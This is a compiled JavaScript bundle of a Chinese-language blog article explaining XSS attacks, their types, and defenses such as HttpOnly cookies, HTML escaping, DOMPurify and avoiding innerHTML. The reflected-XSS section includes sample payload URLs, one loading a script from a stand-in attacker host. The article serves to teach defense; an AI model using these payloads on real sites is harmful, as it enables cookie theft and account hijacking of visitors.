(window.webpackJsonp=window.webpackJsonp||[]).push([[44],{464:function(t,v,_){"use strict";_.r(v);var s=_(1),a=Object(s.a)({},(function(){var t=this,v=t._self._c;return v("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[v("h1",{attrs:{id:"xss攻击是什么"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击是什么"}},[t._v("#")]),t._v(" XSS攻击是什么？")]),t._v(" "),v("h2",{attrs:{id:"基本原理"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#基本原理"}},[t._v("#")]),t._v(" 基本原理")]),t._v(" "),v("blockquote",[v("p",[t._v("Cross-Site Scripting（"),v("span",{staticStyle:{color:"#ff0000"}},[t._v("跨站脚本攻击")]),t._v("），简称XSS，是指恶意攻击者"),v("span",{staticStyle:{color:"#ff0000"}},[t._v("利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去")]),t._v("。使别的用户访问都会在"),v("span",{staticStyle:{color:"#ff0000"}},[t._v("浏览器端")]),t._v("执行相应的嵌入代码。从而盗取用户资料，利用用户身份进行某种动作或对访问者进行病毒侵害的一种攻击方式。")])]),t._v(" "),v("h2",{attrs:{id:"xss攻击的危害"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击的危害"}},[t._v("#")]),t._v(" XSS攻击的危害")]),t._v(" "),v("ul",[v("li",[t._v("盗取页面数据，且可使用js或css破坏页面正常的结构和样式")]),t._v(" "),v("li",[t._v("盗取Cookie")]),t._v(" "),v("li",[t._v("劫持前端逻辑")]),t._v(" "),v("li",[t._v("dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带篡改后的Cookie信息，可以使得服务器端返回400状态码，从而拒绝合理的请求服务")]),t._v(" "),v("li",[t._v("利用iframe、frame、XMLHttpRequest或Flash等方式，以（被攻击者）用户身份进行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用iframe、frame进一步的进行CSRF攻击。")]),t._v(" "),v("li",[t._v("控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。")])]),t._v(" "),v("h2",{attrs:{id:"xss攻击分类"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击分类"}},[t._v("#")]),t._v(" XSS攻击分类")]),t._v(" "),v("h3",{attrs:{id:"存储型xss攻击"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#存储型xss攻击"}},[t._v("#")]),t._v(" 存储型XSS攻击")]),t._v(" "),v("p",[t._v("恶意脚本存储在目标服务器上。当浏览器请求数据时，脚本从服务器传回并执行，影响范围比反射型XSS和DOM型XSS更大。存储型XSS攻击的原因仍然是没有做好数据过滤：前端提交数据至服务器端时，没有做好过滤；服务器端在接受到数据时，在存储前，没有做过滤；前端从服务器端请求到数据，没有过滤输出。")]),t._v(" "),v("p",[t._v("比较常见的场景是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客的用户，都会在他们的浏览器中执行这段恶意js代码。")]),t._v(" "),v("h4",{attrs:{id:"存储型xss的攻击步骤"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#存储型xss的攻击步骤"}},[t._v("#")]),t._v(" 存储型XSS的攻击步骤")]),t._v(" "),v("ol",[v("li",[t._v("攻击者将恶意代码提交到目标网站的数据库中。")]),t._v(" "),v("li",[t._v("用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器")]),t._v(" "),v("li",[t._v("用户浏览器接受到响应后解析执行，混在其中的恶意代码也被执行")]),t._v(" "),v("li",[t._v("恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作")])]),t._v(" "),v("p",[t._v("这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。")]),t._v(" "),v("p",[t._v("它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。任何允许用户存储数据的Web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS。")]),t._v(" "),v("h3",{attrs:{id:"反射型xss攻击"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#反射型xss攻击"}},[t._v("#")]),t._v(" 反射型XSS攻击")]),t._v(" "),v("p",[t._v("反射型XSS漏洞常见于通过URL传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。比如下面的URL：")]),t._v(" "),v("div",{staticClass:"language-bash extra-class"},[v("pre",{pre:!0,attrs:{class:"language-bash"}},[v("code",[t._v("http://x.x.x.x:8080/dosomething?message"),v("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),v("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<script src="')]),t._v("http://www.hacktest.com:8002/xss/hacker.js"),v("span",{pre:!0,attrs:{class:"token string"}},[t._v('"><\/script>"')]),t._v("\n\nhttp://localhost/test.php?param"),v("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),v("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script"),v("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("alert"),v("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("/xss/"),v("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),v("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("/script"),v("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),v("p",[t._v("POST的内容也可以触发反射型XSS，不过触发条件较为苛刻（需要构建表单提交界面，并引导用户点击），所以非常少见。")]),t._v(" "),v("h4",{attrs:{id:"反射型xss的攻击步骤"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#反射型xss的攻击步骤"}},[t._v("#")]),t._v(" 反射型XSS的攻击步骤")]),t._v(" "),v("ol",[v("li",[t._v("攻击者构造出特殊的URL，其中包含恶意代码")]),t._v(" "),v("li",[t._v("用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器")]),t._v(" "),v("li",[t._v("用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行")]),t._v(" "),v("li",[t._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。")])]),t._v(" "),v("p",[v("img",{attrs:{src:"https://gitee.com/yelishu/note/raw/master/noteImgs_2/202311112043709.png",alt:"image.png"}})]),t._v(" "),v("p",[t._v("Chrome和Safari能够检测到url上的XSS攻击，将网页拦截掉，但是其他浏览器不行。")]),t._v(" "),v("p",[t._v("反射型XSS跟存储型XSS的区别是：存储型XSS恶意代码存放在数据库中，反射型XSS恶意代码存放在URL中。")]),t._v(" "),v("h3",{attrs:{id:"dom型xss"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#dom型xss"}},[t._v("#")]),t._v(" DOM型XSS")]),t._v(" "),v("p",[t._v("DOM型XSS攻击，实际上就是前端Javascript代码不够严谨，把不可信的内容插入到了页面，在使用 "),v("code",[t._v(".innerHTML")]),t._v("、"),v("code",[t._v(".outerHTML")]),t._v("、"),v("code",[t._v(".appendChild")]),t._v("、"),v("code",[t._v(".document.write()")]),t._v(" 等API时要特别小心，不要把不可信的数据作为HTML插入到页面上，尽量使用"),v("code",[t._v(".innerText")]),t._v("、"),v("code",[t._v(".textContent")]),t._v("、"),v("code",[t._v(".setAttribute()")]),t._v(" 等")]),t._v(" "),v("h4",{attrs:{id:"dom型xss攻击步骤"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#dom型xss攻击步骤"}},[t._v("#")]),t._v(" DOM型XSS攻击步骤")]),t._v(" "),v("ol",[v("li",[t._v("攻击者构造出特殊的URL，其中包含恶意代码")]),t._v(" "),v("li",[t._v("用户打开带有恶意代码的URL")]),t._v(" "),v("li",[t._v("用户浏览器接收到响应后解析执行，前端Javascript取出URL中的恶意代码并执行")]),t._v(" "),v("li",[t._v("恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作")])]),t._v(" "),v("p",[t._v("DOM型XSS攻击和前两种XSS攻击的区别：DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端Javascript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞。")]),t._v(" "),v("h2",{attrs:{id:"总结"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[t._v("#")]),t._v(" 总结")]),t._v(" "),v("table",[v("thead",[v("tr",[v("th",[t._v("XSS类型")]),t._v(" "),v("th",[t._v("存储型")]),t._v(" "),v("th",[t._v("反射型")]),t._v(" "),v("th",[t._v("DOM型")])])]),t._v(" "),v("tbody",[v("tr",[v("td",[t._v("触发过程")]),t._v(" "),v("td",[t._v("1. 黑客构建XSS脚本存储到目标服务器"),v("br"),t._v(" 2. 正常用户访问携带XSS脚本的页面")]),t._v(" "),v("td",[t._v("1. 正常用户访问携带XSS脚本的URL"),v("br"),t._v(" 2. 服务器端取出URL拼接在HTML中返回给浏览器"),v("br"),t._v(" 3. 浏览器端解析服务器端返回数据的同时运行了恶意代码")]),t._v(" "),v("td",[t._v("1. 正常用户访问携带XSS脚本的URL"),v("br"),t._v(" 2. 浏览器接收到响应后解析执行，Javascript取出URL中恶意代码并执行")])]),t._v(" "),v("tr",[v("td",[t._v("数据存储")]),t._v(" "),v("td",[t._v("数据库")]),t._v(" "),v("td",[t._v("URL")]),t._v(" "),v("td",[t._v("URL")])]),t._v(" "),v("tr",[v("td",[t._v("执行位置")]),t._v(" "),v("td",[t._v("浏览器")]),t._v(" "),v("td",[t._v("浏览器")]),t._v(" "),v("td",[t._v("浏览器")])]),t._v(" "),v("tr",[v("td",[t._v("插入点")]),t._v(" "),v("td",[t._v("HTML")]),t._v(" "),v("td",[t._v("HTML")]),t._v(" "),v("td",[t._v("Javascript")])])])]),t._v(" "),v("h2",{attrs:{id:"防御xss"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#防御xss"}},[t._v("#")]),t._v(" 防御XSS")]),t._v(" "),v("p",[t._v("只要有输入数据的地方，就可能存在XSS危险。")]),t._v(" "),v("h3",{attrs:{id:"常用防范方法"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#常用防范方法"}},[t._v("#")]),t._v(" 常用防范方法")]),t._v(" "),v("ul",[v("li",[v("strong",[t._v("HttpOnly：")]),t._v(" 在Cookie中设置Httponly属性后，Javascript代码将无法读取到Cookie信息。")]),t._v(" "),v("li",[v("strong",[t._v("输入过滤：")]),t._v(" 一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码...等，按照规定的格式输入。不仅仅是前端负责，后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。")]),t._v(" "),v("li",[v("strong",[t._v("转义HTML：")]),t._v(" 如果拼接HTML是必要的，就需要对于引号，尖括号，斜杠进行转义，但这还不是很完善。想对HTML模板各处插入点进行充分的转义，就需要采用合适的转义库（如 "),v("a",{attrs:{href:"https://jsxss.com/zh/index.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("js-xss"),v("OutboundLink")],1),t._v(" 或 "),v("a",{attrs:{href:"https://github.com/cure53/DOMPurify",target:"_blank",rel:"noopener noreferrer"}},[t._v("DOMPurify"),v("OutboundLink")],1),t._v("）")]),t._v(" "),v("li",[v("strong",[t._v("白名单：")]),t._v(" 对应显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法。当然也可以使用黑名单过滤，但需要过滤的标签或标签属性过多。")])]),t._v(" "),v("h3",{attrs:{id:"预防存储型和反射型xss攻击"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#预防存储型和反射型xss攻击"}},[t._v("#")]),t._v(" 预防存储型和反射型XSS攻击")]),t._v(" "),v("p",[t._v("存储型和反射型XSS都是在服务器端取出恶意代码后，插入到响应HTML里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器执行。")]),t._v(" "),v("p",[t._v("预防这两种漏洞，有两种常见作法：")]),t._v(" "),v("ul",[v("li",[t._v("改成纯前端渲染，把代码和数据分隔开。")]),t._v(" "),v("li",[t._v("对HTML做充分转义")])]),t._v(" "),v("h4",{attrs:{id:"纯前端渲染的过程"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#纯前端渲染的过程"}},[t._v("#")]),t._v(" 纯前端渲染的过程")]),t._v(" "),v("p",[t._v("纯前端渲染是一种现代的Web开发方法，其中页面的生成和渲染工作大部分由客户端浏览器负责，而不是服务器生成整个HTML页面，这个过程通常与单页面（SPA）和现代前端框架相关联。")]),t._v(" "),v("ol",[v("li",[v("strong",[t._v("加载静态资源：")]),t._v(" 用户访问网站时，浏览器会请求网页所需的静态文件，比如HTML、CSS和Javascript")]),t._v(" "),v("li",[v("strong",[t._v("初始化应用程序：")]),t._v(" 浏览器下载并解析HTML文件，执行其中的Javascript代码。")]),t._v(" "),v("li",[v("strong",[t._v("数据获取和处理：")]),t._v(" 通过 AJAX或fetch加载业务数据，调用DOM API更新到页面上")])]),t._v(" "),v("p",[v("mark",{staticStyle:{background:"#FF5582A6"}},[t._v("纯前端渲染的优势")])]),t._v(" "),v("ul",[v("li",[v("strong",[t._v("快速响应：")]),t._v(" 页面切换迅速，只加载需要更新的部分而不是整个页面")]),t._v(" "),v("li",[v("strong",[t._v("更好的用户体验：")]),t._v(" 页面无需频繁刷新，交互更流畅，给用户更好的体验。")]),t._v(" "),v("li",[v("strong",[t._v("离线支持：")]),t._v(" 通过适当的缓存和离线存储技术，应用程序可以在离线时通过基本功能")])]),t._v(" "),v("p",[v("mark",{staticStyle:{background:"#ABF7F7A6"}},[t._v("注意事项")])]),t._v(" "),v("ul",[v("li",[v("strong",[t._v("安全性：")]),t._v(" 虽然大大减少了存储型和反射型XSS漏洞的风险，但仍需对用户输入数据进行适当的验证、过滤和转义，以避免其他类型安全的风险")]),t._v(" "),v("li",[v("strong",[t._v("SEO（搜索引擎优化）：")]),t._v(" 搜索引擎对纯前端渲染的内容的索引和理解可能会有限，需要额外的优化来确保良好的SEO。")])]),t._v(" "),v("h3",{attrs:{id:"预防dom型xss攻击"}},[v("a",{staticClass:"header-anchor",attrs:{href:"#预防dom型xss攻击"}},[t._v("#")]),t._v(" 预防DOM型XSS攻击")]),t._v(" "),v("p",[t._v("DOM 型 XSS 攻击，实际上就是网站前端JavaScript代码本身不够严谨，把不可信的数据当作代码执行了。")]),t._v(" "),v("p",[t._v("在使用 "),v("code",[t._v(".innerHTML")]),t._v("、"),v("code",[t._v(".outerHTML")]),t._v("、"),v("code",[t._v("document.write()")]),t._v(" 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 "),v("code",[t._v(".textContent")]),t._v("、"),v("code",[t._v(".setAttribute()")]),t._v(" 等。")]),t._v(" "),v("p",[t._v("如果用 Vue/React 技术栈，并且不使用 "),v("code",[t._v("v-html")]),t._v("/"),v("code",[t._v("dangerouslySetInnerHTML")]),t._v(" 功能，就在前端 render 阶段避免 "),v("code",[t._v("innerHTML")]),t._v("、"),v("code",[t._v("outerHTML")]),t._v(" 的 XSS 隐患。")]),t._v(" "),v("p",[t._v("DOM 中的内联事件监听器，如 "),v("code",[t._v("location")]),t._v("、"),v("code",[t._v("onclick")]),t._v("、"),v("code",[t._v("onerror")]),t._v("、"),v("code",[t._v("onload")]),t._v("、"),v("code",[t._v("onmouseover")]),t._v(" 等，"),v("code",[t._v("<a>")]),t._v(" 标签的 "),v("code",[t._v("href")]),t._v(" 属性，JavaScript 的 "),v("code",[t._v("eval()")]),t._v("、"),v("code",[t._v("setTimeout()")]),t._v("、"),v("code",[t._v("setInterval()")]),t._v(" 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。")])])}),[],!1,null,null,null);v.default=a.exports}}]);